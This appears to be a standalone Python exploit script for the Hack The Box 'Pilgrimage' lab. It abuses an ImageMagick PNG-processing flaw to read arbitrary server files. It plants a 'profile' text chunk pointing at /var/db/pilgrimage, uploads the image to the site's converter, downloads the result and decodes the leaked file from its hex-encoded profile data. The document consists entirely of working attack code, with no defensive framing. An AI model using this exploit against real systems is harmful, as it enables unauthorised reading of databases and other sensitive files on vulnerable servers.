from PIL import Image, PngImagePlugin
from PIL.PngImagePlugin import PngInfo
from urllib.parse import parse_qs, urlparse
import requests

# Attach requested file via adding text chunk with key profile: {path}
info = PngImagePlugin.PngInfo()
info.add_text("profile","/var/db/pilgrimage")
im = Image.open("./test.png")
im.save("./enc.png", pnginfo=info)

# send file via POST form
url = 'http://pilgrimage.htb/'
files = {'toConvert': ('enc.png',open('./enc.png','rb'))}
r = requests.post(url,files=files)

# read url
encodedUrl = parse_qs(urlparse(r.url).query)
imgToDl = encodedUrl['message']

# get Info stealer png
r = requests.get(imgToDl[0],stream=True)
with open('./dl.png','wb') as f:
    for c in r:
        f.write(c)

# read Raw profile type which is where the file is attached 
info = Image.open('./dl.png')
try:
    hexStr = str(info.info['Raw profile type'])
    with open('./dlhex.txt','w') as f:
        f.write(hexStr)
        f.close
    # convert recovered hex to str
    print(bytes.fromhex(hexStr))
except Exception as e:
    print(e,"Error ( File either cannot be read or doesn't exist on target )")

